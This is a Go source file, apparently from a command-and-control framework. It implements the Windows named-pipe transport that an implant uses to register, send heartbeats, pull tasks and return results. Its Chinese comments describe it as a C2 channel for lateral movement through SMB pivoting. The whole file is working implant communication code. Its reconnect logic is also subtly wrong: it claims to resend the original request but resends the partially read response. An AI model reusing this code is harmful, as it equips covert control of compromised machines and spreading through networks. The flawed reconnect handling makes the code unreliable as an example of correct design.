//go:build windows && amd64

// Package transport 提供 Named Pipe 传输（Windows 实现）。
// Named Pipe 作为 C2 传输通道，适用于横向渗透（SMB pivot）。
package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"time"

	"github.com/aegis-c2/aegis/shared/protocol"
)

// NamedPipeTransportConfig 是 Named Pipe Transport 配置。
type NamedPipeTransportConfig struct {
	PipeName   string        // 命名管道名称
	RemoteHost string        // 远程主机（空=本地，横向移动时指定）
	Timeout    time.Duration // 读写超时（默认 30 秒）
}

// NamedPipeTransport 实现了 Transporter 接口的 Named Pipe 传输。
type NamedPipeTransport struct {
	config  *NamedPipeTransportConfig
	agentID string
	client  *NamedPipeClient
	timeout time.Duration // 读写超时（默认 30 秒）
}

// NewNamedPipeTransport 创建 Named Pipe Transport 实例。
func NewNamedPipeTransport(cfg *NamedPipeTransportConfig, agentID string) *NamedPipeTransport {
	timeout := cfg.Timeout
	if timeout == 0 {
		timeout = 30 * time.Second
	}
	return &NamedPipeTransport{
		config:  cfg,
		agentID: agentID,
		timeout: timeout,
	}
}

func (n *NamedPipeTransport) connect() error {
	if n.client != nil {
		return nil
	}
	n.client = NewNamedPipeClient(n.config.PipeName, n.config.RemoteHost)
	return n.client.Connect()
}

func (n *NamedPipeTransport) sendEnvelope(env *protocol.Envelope) error {
	if err := n.connect(); err != nil {
		return err
	}
	// A-P1-5: 设置写超时，防止永久阻塞
	n.client.SetDeadline(time.Now().Add(n.timeout))
	defer n.client.SetDeadline(time.Time{}) // 重置

	data, err := json.Marshal(env)
	if err != nil {
		return err
	}
	written, err := n.client.Write(data)
	if err != nil {
		// 连接断开，尝试重连一次
		n.client = nil
		if err2 := n.connect(); err2 != nil {
			return fmt.Errorf("pipe write failed and reconnect failed: %v (original: %w)", err2, err)
		}
		n.client.SetDeadline(time.Now().Add(n.timeout))
		written, err = n.client.Write(data)
	}
	if err != nil {
		return err
	}
	if written != len(data) {
		return fmt.Errorf("partial pipe write: %d/%d bytes", written, len(data))
	}
	return nil
}

func (n *NamedPipeTransport) recvEnvelope() (*protocol.Envelope, error) {
	if n.client == nil {
		return nil, fmt.Errorf("pipe not connected")
	}
	// A-P1-5: 设置读超时
	n.client.SetDeadline(time.Now().Add(n.timeout))
	defer n.client.SetDeadline(time.Time{})

	// 循环读取直到获得完整 JSON 消息（处理 TCP/pipe 分片）
	var buf bytes.Buffer
	chunk := make([]byte, 65536) // 增大缓冲区从 4096 到 64K
	for {
		bytesRead, err := n.client.Read(chunk)
		if bytesRead > 0 {
			buf.Write(chunk[:bytesRead])
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			// F-P2-3: Connection lost during read — reconnect and resend the
			// original request. The new pipe has no knowledge of the prior
			// request, so simply continuing to read would block forever or
			// read stale data from another session.
			sentData := buf.Bytes()
			n.client = nil
			if err2 := n.connect(); err2 != nil {
				return nil, fmt.Errorf("pipe read failed and reconnect failed: %v (original: %w)", err2, err)
			}
			n.client.SetDeadline(time.Now().Add(n.timeout))
			// Resend whatever was already written before the disconnect
			if len(sentData) > 0 {
				if _, err3 := n.client.Write(sentData); err3 != nil {
					return nil, fmt.Errorf("resend after reconnect failed: %v (original read err: %w)", err3, err)
				}
			}
			buf.Reset()
			continue
		}
		// 尝试解析 JSON，成功则返回
		var env protocol.Envelope
		if err := json.Unmarshal(buf.Bytes(), &env); err == nil {
			return &env, nil
		}
		// 防止无限循环：如果缓冲区过大仍未解析成功
		if buf.Len() > 10*1024*1024 { // 10MB limit
			return nil, fmt.Errorf("message too large (>10MB)")
		}
	}
	var env protocol.Envelope
	if err := json.Unmarshal(buf.Bytes(), &env); err != nil {
		return nil, fmt.Errorf("json unmarshal: %w (got %d bytes)", err, buf.Len())
	}
	return &env, nil
}

// Register 通过 Named Pipe 注册 Agent。
func (n *NamedPipeTransport) Register(env *protocol.Envelope) (*map[string]string, error) {
	if err := n.sendEnvelope(env); err != nil {
		return nil, fmt.Errorf("named pipe register: %w", err)
	}
	resp, err := n.recvEnvelope()
	if err != nil {
		return nil, fmt.Errorf("named pipe register response: %w", err)
	}
	result := map[string]string{"agent_id": resp.AgentID, "status": "ok"}
	return &result, nil
}

// Heartbeat 通过 Named Pipe 发送心跳。
func (n *NamedPipeTransport) Heartbeat(env *protocol.Envelope) (*map[string]string, error) {
	if err := n.sendEnvelope(env); err != nil {
		return nil, fmt.Errorf("named pipe heartbeat: %w", err)
	}
	_, err := n.recvEnvelope()
	if err != nil {
		return nil, fmt.Errorf("named pipe heartbeat response: %w", err)
	}
	return &map[string]string{"status": "ok"}, nil
}

// PollTask 通过 Named Pipe 拉取任务。
func (n *NamedPipeTransport) PollTask(env *protocol.Envelope) ([]byte, error) {
	if err := n.sendEnvelope(env); err != nil {
		return nil, fmt.Errorf("named pipe poll: %w", err)
	}
	resp, err := n.recvEnvelope()
	if err != nil {
		return nil, fmt.Errorf("named pipe poll response: %w", err)
	}
	return resp.Payload, nil
}

// SubmitResult 通过 Named Pipe 提交结果。
func (n *NamedPipeTransport) SubmitResult(env *protocol.Envelope) (*map[string]string, error) {
	if err := n.sendEnvelope(env); err != nil {
		return nil, fmt.Errorf("named pipe result: %w", err)
	}
	return &map[string]string{"status": "ok"}, nil
}

// Close 关闭 Named Pipe 连接。
func (n *NamedPipeTransport) Close() error {
	if n.client != nil {
		return n.client.Close()
	}
	return nil
}

// SetDeadline 实现 net.Conn 兼容性。
func (n *NamedPipeTransport) SetDeadline(t time.Time) error {
	if n.client != nil {
		return n.client.SetDeadline(t)
	}
	return nil
}
